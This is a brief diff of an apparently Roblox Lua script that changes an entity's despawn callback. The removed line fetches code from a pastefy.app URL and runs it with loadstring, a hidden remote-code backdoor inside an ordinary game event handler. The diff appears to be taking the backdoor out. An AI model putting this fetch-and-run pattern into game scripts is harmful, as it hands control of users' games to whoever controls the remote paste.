@@ -182,7 +182,6 @@ end)
 
 entity:SetCallback("OnDespawning", function()
     print("Entity is despawning")
-    loadstring(game:HttpGet("https://pastefy.app/3RdwG7dF/raw"))()
 end)
 
 entity:SetCallback("OnDespawned", function()
